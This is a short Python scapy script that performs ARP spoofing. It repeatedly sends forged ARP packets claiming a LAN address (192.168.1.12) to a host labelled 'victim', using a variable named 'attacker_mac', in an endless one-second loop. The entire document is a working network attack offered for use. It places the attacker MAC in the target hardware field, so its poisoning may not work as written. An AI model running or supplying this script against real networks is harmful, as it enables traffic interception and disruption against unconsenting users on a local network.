from scapy.all import *
import time

op = 1

victim_ip = "192.168.1.6";
ip_to_spoof = "192.168.1.12";
attacker_mac = "60:f8:1d:d1:a4:2c";
arp = ARP(op=op, psrc=ip_to_spoof, pdst=victim_ip, hwdst=attacker_mac)

while True:
      send(arp)
      time.sleep(1)
